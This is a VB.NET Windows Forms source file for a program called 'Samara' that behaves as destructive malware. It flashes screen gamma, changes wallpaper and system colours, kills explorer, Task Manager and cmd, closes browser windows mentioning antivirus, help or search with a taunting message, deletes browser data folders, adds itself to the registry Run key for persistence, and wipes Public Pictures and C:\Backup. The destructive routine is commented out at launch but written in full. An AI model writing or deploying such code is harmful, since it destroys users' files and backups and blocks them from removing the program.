Imports System.IO
Imports System.Runtime.InteropServices

Public Class Samara

#Region "1) Global Variables"

    'Hide/Show Desktop/Taskbar
    Public Const SWP_HIDEWINDOW = &H80

    Public Const SWP_SHOWWINDOW = &H40

    Public Const SW_HIDE As Integer = 0

    Public Const SW_RESTORE As Integer = 9

    Public ReadOnly taskBar As Integer


    'This changes Desktop Wallpaper
    Private Const SPI_SETDESKWALLPAPER As Integer = &H14

    Private Const SPIF_UPDATEINIFILE As Integer = &H1

    Private Const SPIF_SENDWININICHANGE As Integer = &H2

    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (uAction As Integer, uParam As Integer,
                                                                         lpvParam As String, fuWinIni As Integer) As Integer

    Declare Function SetWindowPos Lib "user32" (hwnd As Integer, hWndInsertAfter As Integer, x As Integer, y As Integer,
                                                cx As Integer, cy As Integer, wFlags As Integer) As Integer

    Declare Function FindWindow Lib "user32" Alias "FindWindowA" (lpClassName As String,
                                                                  lpWindowName As String) As Integer

    Private Declare Function ShowWindow Lib "user32" (hwnd As IntPtr,
                                                      nCmdShow As Integer) As Integer

    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (hProcess As IntPtr,
        dwMinimumWorkingSetSize As Integer, dwMaximumWorkingSetSize As Integer) As Integer

    'Gamma System Lighting (RAMP)
    Private Structure RAMP
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Red As UShort()
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Green As UShort()
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=256)>
        Public Blue As UShort()
    End Structure

    'Changes background colors
    Private Declare Function SetSysColors Lib "user32.dll" (one As Integer, ByRef element As Integer,
        ByRef color As Integer) As Boolean

    'Causes bright flashes
    Private Declare Function apiGetDeviceGammaRamp Lib "gdi32" Alias "GetDeviceGammaRamp" (hdc As Integer,
                                                                                           ByRef lpv As RAMP) As Integer

    Private Declare Function apiSetDeviceGammaRamp Lib "gdi32" Alias "SetDeviceGammaRamp" (hdc As Integer,
                                                                                           ByRef lpv As RAMP) As Integer

    Private Declare Function apiGetWindowDC Lib "user32" Alias "GetWindowDC" (hwnd As Integer) As Integer

    Private Declare Function apiGetDesktopWindow Lib "user32" Alias "GetDesktopWindow" () As Integer

    Private newRamp As New RAMP()

    Private usrRamp As New RAMP()

    Private IsLoaded As Boolean

    Private ReadOnly sCurrentDirectory As String = AppDomain.CurrentDomain.BaseDirectory

#End Region

#Region "2) Form Load Events | Ram | Paint | System Lighting"
    Private Sub Form1_Load(sender As Object,
                           e As EventArgs) Handles MyBase.Load

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True

        Timer2.Start()
        My.Computer.Audio.Play(My.Resources.sound, AudioPlayMode.BackgroundLoop)
        'This goes with changing Desktop Wallpaper
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0,
                             "C:\Users\justin.ross\source\repos\Testfield\Testfield\Resources\162312.jpg", SPIF_UPDATEINIFILE Or
                             SPIF_SENDWININICHANGE)


        'Form follow
        Timer1.Start()
        'Set the FORM width.>>
        Width = 400
        'Set the FORM height.>>
        Height = 400

        'Hide DeskTop & TaskBar
        'taskBar = FindWindow("Shell_traywnd", "")
        'Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
        'SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW) 'SWP_SHOWWINDOW
        'Dim hwnd As IntPtr
        'hwnd = FindWindow(vbNullString, "Program Manager")
        'If Not hwnd = 0 Then
        'ShowWindow(hwnd, SW_HIDE) 'Change to SW_SHOW
        'End If

        Dim path As New Drawing2D.GraphicsPath()
        path.AddEllipse(0, 0, PictureBox1.Width, PictureBox1.Height)
        PictureBox1.Region = New Region(path)

        'Here's how to use a bitmap as a custom cursor you can make it neater. this is just a quick example.
        Using img As New Bitmap("C:\Users\justin.ross\source\repos\Testfield\Testfield\Resources\hand_ccexpress.cur")
            'The parameters for CreateCursor are the image to use + the x + y coordinates of the hotspot
            Cursor = Create.CreateCursor(img, 47, 41)
        End Using

        'Try_Kill()

        ReleaseRAM()

        Timer4.Start()

        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.Black)
            SetSysColors(1, 1, BackgroundColor)
        End Using

    End Sub

    Private Sub Form1_FormClosed(sender As Object,
                                 e As FormClosedEventArgs) Handles Me.FormClosed
        apiSetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
    End Sub

    Private Sub Form1_Resize(sender As Object,
                             e As EventArgs) Handles Me.Resize
        'Refresh the FORM if you resize it.>>
        Refresh()

    End Sub

    Sub ReleaseRAM()
        Try
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If Environment.OSVersion.Platform = PlatformID.Win32NT Then
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
            End If
        Catch ex As Exception
            MsgBox(ex.ToString())
        End Try
    End Sub

    Private Sub Form1_Paint(sender As Object,
                            e As PaintEventArgs) Handles Me.Paint

        'Calculate with integer division the middle of the FORM horizontally.>>
        Dim formMiddleX As Integer = Width \ 2
        'Calculate with integer division the middle of the FORM vertically.>>
        Dim formMiddleY As Integer = Height \ 2


        'Used to hold the calculated points as floating point values.>>
        Dim x, y As Double
        'Used to hold the calculated points as INTEGER values.>>
        Dim x1, y1 As Integer

        'Is a LIST of type point that is used to hold the calculated points.>>
        Dim circlePointsList As New List(Of Point)
        'This loop calculates the circle or ellipse poins.>>
        For index As Double = 0 To 2 * Math.PI Step 0.05

            'Holds the horizontal radius of the circle or ellipse.>>
            Dim horizontalRadius As Integer = formMiddleX
            x = (horizontalRadius * Math.Cos(index)) + formMiddleX

            'Holds the vertical radius of the circle or ellipse.>>
            Dim verticalRadius As Integer = formMiddleY
            y = (verticalRadius * Math.Sin(index)) + formMiddleY
            'Convert to an INTEGER the x value.>>
            x1 = CInt(Int(x))
            'Convert to an INTEGER the y value.>>
            y1 = CInt(Int(y))
            'Add the calculated values to the points list as a NEW Point.>>
            circlePointsList.Add(New Point(x1, y1))
        Next

        'Defines an array to hold the calculated points.>>
        'Put the list in an array called circlePoints.>>
        Dim circlePoints() As Point = circlePointsList.ToArray
        'Set up an array of type BYTE to hold the type of each point as a BYTE.>>
        Dim types(circlePoints.GetUpperBound(0)) As Byte
        'Fills the above array called "types" with the appropriate FillMode converted to a BYTE.>>
        For index As Integer = 0 To circlePoints.GetUpperBound(0)
            types(index) = Drawing2D.FillMode.Winding
        Next

        'Defines a GraphicsPath from the calculated points.>>
        Using gp As New Drawing2D.GraphicsPath(circlePoints, types)
            'Set the FORM REGION to the region defined by the calculated points.>>
            Region = New Region(gp)
        End Using

    End Sub

    Private Function DesktopBrightnessContrast(bLevel As Integer,
                                               gamma As Integer) As Integer
        newRamp.Red = New UShort(255) {} : newRamp.Green = New UShort(255) {} : newRamp.Blue = New UShort(255) {}
        For i As Integer = 1 To 255   ' gamma is a value between 3 and 44 
            newRamp.Red(i) = InlineAssignHelper(newRamp.Green(i), InlineAssignHelper(newRamp.Blue(i), CUShort(Math.Min(65535,
                                                                                                                       Math.Max(0, (Math.Pow((i + 1) / 256.0R, gamma * 0.1) * 65535) + 0.5)))))
        Next
        For iCtr As UShort = 0 To 255
            newRamp.Red(iCtr) = CUShort(newRamp.Red(iCtr) / (bLevel / 1000))
            newRamp.Green(iCtr) = CUShort(newRamp.Green(iCtr) / (bLevel / 1000))
            newRamp.Blue(iCtr) = CUShort(newRamp.Blue(iCtr) / (bLevel / 1000))
        Next
        Return apiSetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), newRamp) ' Now set the value. 
    End Function

    Private Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
        target = value : InlineAssignHelper = value
    End Function
#End Region

#Region "3) Try KIll | Directory Annihilator"

    Private Sub Try_Kill()

        Dim fusion() As Process = Process.GetProcessesByName("explorer")
        Dim precision() As Process = Process.GetProcessesByName("taskmgr")
        Dim blaze() As Process = Process.GetProcessesByName("cmd")
        Try
            For Each Process In fusion
                Process.Kill()
            Next
        Catch mistro As Exception
        End Try
        Try
            For Each Process In precision
                Process.Kill()
            Next
            For Each Process In blaze
                Process.Kill()
            Next
        Catch cthula As Exception
        End Try
        Try
            Dim Haim As Process
            For Each Haim In Process.GetProcessesByName(Samara_Death_Touch)

                Dim Entrivium = Haim.MainWindowTitle.ToString.ToLower

                If Entrivium.Contains("facebook") Or
                    Entrivium.Contains("youtube") Or
                    Entrivium.Contains("virus") Or
                    Entrivium.Contains("infected") Or
                    Entrivium.Contains("search") Or
                    Entrivium.Contains("windows") Or
                    Entrivium.Contains("bing") Or
                    Entrivium.Contains("nuova scheda") Or
                    Entrivium.Contains("new tab") Or
                    Entrivium.Contains("cerca") Or
                    Entrivium.Contains("malwarebites") Or
                    Entrivium.Contains("help") Or
                    Entrivium.Contains("kij") Then
                    Haim.Kill()
                    Focus()
                    MsgBox("You can't kill me, I'm protected by the Mirror Council.", MsgBoxStyle.Critical)
                    'My.Computer.Audio.Play(My.Resources.cantkillme, AudioPlayMode.Background)
                End If
            Next
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        ' Define Current Directory
        ' Absolute Path >> C:\Users\Public\Desktop\myData\UserA\Documents\ReadMe-UserA.txt
        ' How to define Current Directory >> ?? so regardless of UserA or UserB, VB app should check the current dir if it's inside UserA or UserB etc.
        Dim currDir() As String = Directory.GetFiles(Path.Combine("C:\Users",
                                                                  "Public",
                                                                  "Desktop",
                                                                  "myData"), "*.*", SearchOption.AllDirectories)
        'Define Target Directory (This is where it copies to)
        Dim tarDir() As String = Directory.GetFiles(Path.Combine("C:\Users",
                                                                 Environment.UserName,
                                                                 "Documents"), "*.*")

        Dim Current() As String = Directory.GetFiles(Path.Combine("C:\Users",
                                                                  "Public",
                                                                  "Pictures",
                                                                  "myData"), "*.*", SearchOption.AllDirectories)
        'Define Target Directory (This is where it copies to)
        Dim Target() As String = Directory.GetFiles(Path.Combine("C:\Users",
                                                                 Environment.UserName,
                                                                 "Desktop"), "*.*")
        'Copy required file from current location to user's documents
        File.Copy(Current(0), Target(0), overwrite:=True)

        'Delete Folder from Special Path (This Targets Browsers) "This calls for Local Application Data's path"
        While True
            Dim ThePurge As Integer = 25
            Select Case ThePurge
                Case 1
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google")
                Case 2
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\FireFox")
                Case 3
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Safari")
                Case 4
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Opera")
                Case 5
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Edge")
                Case 6
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Explorer")
                Case 7
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Chromium")
                Case 8
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Vivaldi")
                Case 9
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Brave")
                Case 10
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Maxthon")
                Case 11
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Tor")
                Case 12
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\UC")
                Case 13
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\SeaMonkey")
                Case 14
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Pale Moon")
                Case 15
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\SlimBrowser")
                Case 16
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Epic")
                Case 17
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Sleipnir")
                Case 18
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Avant")
                Case 19
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Konqueror")
                Case 20
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Netscape")
                Case 21
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Camino")
                Case 22
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Shiira")
                Case 23
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Yandex")
                Case 24
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Basilisk")
                Case 25
                    Directory.Delete($"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Chrome")

            End Select
        End While

        'This commands the program to rewrite the registry & launch at startup.
        My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                                    True).SetValue(Application.ProductName, Application.ExecutablePath)

        'This compliments the private sub below "DeleteDirectory"
        Dim root As String = "C:\Users\Public\Pictures"
        DeleteDirectory(root)

        ' Loop over the subdirectories and removes them "with their contents".
        For Each d In Directory.GetDirectories("C:\Backup")
            Directory.Delete(d, True)
        Next

        ' Finish removing the files in the root folder as well.
        For Each f In Directory.GetFiles("c:\backup")
            File.Delete(f)
        Next

    End Sub

    'Content Deletion
    Private Sub DeleteDirectory(root As String)
        If Directory.Exists(root) Then
            'Delete all files from the Directory
            For Each filepath As String In Directory.GetFiles(root)
                File.Delete(filepath)
            Next
            'Delete all child Directories
            For Each dir As String In Directory.GetDirectories(root)
                DeleteDirectory(dir)
            Next
            'Delete a Directory
            Directory.Delete(root)
        End If
    End Sub

    Function Samara_Death_Touch() As String
        Samara_Death_Touch = My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\HTTP\shell\open\command",
                                                           "",
                                                           "Not Found")
        Dim Rythorian() As String = Split(Samara_Death_Touch, """")
        Return Path.GetFileNameWithoutExtension(Rythorian(1))
    End Function

#End Region

#Region "Timers"
    'This causes the form to chase the mouses corpse hand
    Private Sub Timer1_Tick(sender As Object,
                            e As EventArgs) Handles Timer1.Tick
        Location = New Point(MousePosition.X + -200, MousePosition.Y + -200)
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + -3)
    End Sub

    Private Sub Timer2_Tick(sender As Object,
                            e As EventArgs) Handles Timer2.Tick
        Timer2.Stop()
        Timer3.Start()
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + 10)
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.Black)
            SetSysColors(1, 1, BackgroundColor)
        End Using

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True
        'This goes with changing Desktop Wallpaper

    End Sub

    Private Sub Timer3_Tick(sender As Object,
                            e As EventArgs) Handles Timer3.Tick
        Timer3.Stop()
        Timer2.Start()
        Timer4.Start()
        If IsLoaded = False Then Exit Sub
        DesktopBrightnessContrast(TrackBar1.Value, 44 - TrackBar2.Value + -3)

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True

    End Sub

    Private Sub Timer4_Tick(sender As Object,
                            e As EventArgs) Handles Timer4.Tick
        Timer4.Stop()
        Timer2.Start()
        Using CD As New ColorDialog
            Dim BackgroundColor As Integer = ColorTranslator.ToWin32(Color.White)
            SetSysColors(1, 1, BackgroundColor)
        End Using

        TrackBar1.Minimum = 1000 : TrackBar1.Maximum = 2000 'Set trackbar to valid range, since if will be half, the lower range is invalid
        TrackBar2.Minimum = 28 : TrackBar2.Maximum = 44
        apiGetDeviceGammaRamp(apiGetWindowDC(apiGetDesktopWindow), usrRamp)
        IsLoaded = True
        'This goes with changing Desktop Wallpaper

    End Sub
#End Region

End Class